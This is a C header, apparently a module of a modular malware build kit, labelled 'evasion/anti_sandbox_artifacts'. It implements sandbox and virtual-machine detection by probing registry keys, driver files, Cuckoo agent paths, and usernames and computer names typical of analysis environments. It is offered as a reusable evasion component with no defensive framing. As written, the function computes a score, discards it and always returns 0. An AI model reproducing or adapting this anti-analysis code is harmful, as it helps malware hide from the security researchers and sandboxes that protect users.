// chunk: evasion/anti_sandbox_artifacts
// depends: (none)
// provides: sandbox_check
// headers: windows.h
// risk: low
// note: Registry + filesystem artifact scanning for VMware, VirtualBox, Cuckoo, Wine, QEMU, Hyper-V, and known sandbox usernames

#ifndef CHUNK_ANTI_SANDBOX_ARTIFACTS
#define CHUNK_ANTI_SANDBOX_ARTIFACTS

#include <windows.h>

static int sb_check_reg_key(HKEY root, const char *path) {
    HKEY hk;
    if (RegOpenKeyExA(root, path, 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        RegCloseKey(hk);
        return 1;
    }
    return 0;
}

static int sb_check_file(const char *path) {
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

static int sb_str_contains_i(const char *haystack, const char *needle) {
    for (const char *h = haystack; *h; h++) {
        const char *a = h, *b = needle;
        while (*a && *b) {
            char ca = *a >= 'A' && *a <= 'Z' ? *a + 32 : *a;
            char cb = *b >= 'A' && *b <= 'Z' ? *b + 32 : *b;
            if (ca != cb) break;
            a++; b++;
        }
        if (!*b) return 1;
    }
    return 0;
}

static int sandbox_check(void) {
    int score = 0;

    score += sb_check_reg_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools");
    score += sb_check_reg_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware VGAuth");
    score += sb_check_reg_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions");
    score += sb_check_reg_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters");
    score += sb_check_reg_key(HKEY_CURRENT_USER, "SOFTWARE\\Wine");

    score += sb_check_file("C:\\Windows\\System32\\drivers\\vmhgfs.sys");
    score += sb_check_file("C:\\Windows\\System32\\drivers\\vmmouse.sys");
    score += sb_check_file("C:\\Windows\\System32\\drivers\\VBoxMouse.sys");
    score += sb_check_file("C:\\Windows\\System32\\VBoxService.exe");
    score += sb_check_file("C:\\agent\\agent.py");
    score += sb_check_file("C:\\cuckoo\\agent.py");

    char username[256] = {0};
    DWORD usize = sizeof(username);
    if (GetUserNameA(username, &usize)) {
        const char *bad_names[] = {
            "sandbox", "malware", "virus", "sample",
            "analyzer", "analysis", "cuckoo",
            "CurrentUser", "John", "Peter Wilson",
            NULL
        };
        for (int i = 0; bad_names[i]; i++) {
            if (sb_str_contains_i(username, bad_names[i]))
                score++;
        }
    }

    char compname[256] = {0};
    DWORD csize = sizeof(compname);
    if (GetComputerNameA(compname, &csize)) {
        const char *bad_comps[] = {
            "SANDBOX", "VIRUS", "MALWARE", "CUCKOO",
            "ANALYSIS", "TEQUILABOOMBOOM",
            NULL
        };
        for (int i = 0; bad_comps[i]; i++) {
            if (sb_str_contains_i(compname, bad_comps[i]))
                score++;
        }
    }

    (void)score;
    return 0;
}

#endif
